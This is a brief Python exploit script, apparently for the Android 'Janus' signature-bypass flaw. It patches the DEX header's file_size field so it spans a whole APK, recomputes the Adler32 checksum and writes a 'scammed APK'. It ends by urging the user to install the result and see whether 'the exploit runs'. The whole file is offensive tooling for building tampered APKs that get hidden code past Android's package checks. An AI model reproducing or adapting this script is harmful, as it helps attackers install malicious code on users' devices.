#!/usr/bin/env python3
# scam_android.py - Make DEX header claim the entire APK file size
import struct, sys, os

if len(sys.argv) != 3:
    sys.exit("Usage: scam_android.py <janus_apk> <output_apk>")

input_apk, output_apk = sys.argv[1:]

# Read the Janus APK
with open(input_apk, 'rb') as f:
    apk_data = bytearray(f.read())

total_size = len(apk_data)
print(f"📱 Total APK size: {total_size} bytes")

# Check current DEX header
dex_magic = apk_data[:8]
current_checksum = struct.unpack('<I', apk_data[8:12])[0]
current_file_size = struct.unpack('<I', apk_data[32:36])[0]

print(f"🔍 Current DEX magic: {dex_magic}")
print(f"🔍 Current file_size: {current_file_size} bytes")
print(f"🔍 Current checksum: 0x{current_checksum:08x}")

if dex_magic != b'dex\n035\x00':
    sys.exit("❌ Not a valid DEX file at the beginning!")

# Update the file_size field to claim the entire APK
print(f"🎯 Updating file_size from {current_file_size} to {total_size}")
struct.pack_into('<I', apk_data, 32, total_size)

# Recalculate checksum (Adler32 of everything after first 12 bytes)
import zlib
new_checksum = zlib.adler32(apk_data[12:]) & 0xffffffff
struct.pack_into('<I', apk_data, 8, new_checksum)

print(f"🔧 Updated checksum: 0x{new_checksum:08x}")

# Write the scammed APK
with open(output_apk, 'wb') as f:
    f.write(apk_data)

print(f"✅ Created scammed APK: {output_apk}")
print(f"🎭 DEX header now claims entire file ({total_size} bytes)")
print(f"💡 Android might think: 'This is a huge DEX file that happens to have ZIP data at the end'")
print(f"🚀 Try installing and see if the exploit runs!")
